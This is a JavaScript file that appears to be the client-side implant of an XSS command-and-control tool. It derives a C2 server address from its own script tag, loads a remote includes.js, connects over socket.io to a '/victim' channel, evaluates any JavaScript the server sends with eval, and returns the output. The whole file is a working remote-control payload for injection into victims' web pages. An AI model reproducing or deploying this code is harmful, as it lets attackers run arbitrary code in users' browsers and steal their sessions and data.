var scriptsrc = document.getElementById("hacker").getAttribute("src");
var c2server = scriptsrc.substring(0, scriptsrc.length - 11);
(function(d, s, id) {
    var js, fjs = d.getElementsByTagName(s)[0];
    if (d.getElementById(id)) {
        return;
    }
    js = d.createElement(s);
    js.id = id;
    js.onload = function() {
        $(document).ready(function() {
            var socket = io.connect(c2server + '/victim');

            function sendOutput(taskid, message) {
                socket.emit('task output', {
                    id: taskid,
                    output: String(message)
                });
                return false;
            }
            socket.on('issue task', function(msg) {
                id = msg['id'];
                try {
                    var cmdout = eval(String(msg['input'])); //do the task
                    if (String(msg['input']).includes('sendOutput') == false) {
                        sendOutput(id, cmdout);
                    }
                } catch (err) {
                    sendOutput(id, err);
                }
            });
        });
    };
    js.src = c2server + "/includes.js";
    fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'xss-includes'));